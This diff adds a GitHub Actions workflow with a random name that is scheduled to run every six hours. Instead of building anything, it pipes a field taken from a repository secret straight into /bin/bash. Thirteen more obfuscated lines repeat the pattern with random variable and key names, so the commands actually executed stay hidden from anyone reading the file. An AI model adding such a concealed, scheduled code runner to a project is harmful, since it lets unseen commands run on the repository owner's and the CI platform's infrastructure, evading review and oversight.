@@ -1,0 +1,29 @@
+name: jaijkx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jaijkx
+        env:
+          e67: ${{ secrets.e67 }}
+        run: |
+          echo $e67 | jq -r .d590 | /bin/bash
+          echo $ly7123 | jq -r .ctc04 | /bin/bash
+          echo $ze5 | jq -r .h35660 | /bin/bash
+          echo $eg342 | jq -r .ffoh96515 | /bin/bash
+          echo $cvi596 | jq -r .jufqq050 | /bin/bash
+          echo $ntno6785 | jq -r .qxnr473 | /bin/bash
+          echo $tz6142 | jq -r .n50405 | /bin/bash
+          echo $u204 | jq -r .jcztl41018 | /bin/bash
+          echo $gvq1 | jq -r .rxzxi9801 | /bin/bash
+          echo $yqny85045 | jq -r .xcpe263 | /bin/bash
+          echo $cl29 | jq -r .qcu825 | /bin/bash
+          echo $z4 | jq -r .y28 | /bin/bash
+          echo $mrbi157 | jq -r .qszqg57749 | /bin/bash
+          echo $xbbyp3277 | jq -r .e139 | /bin/bash
+
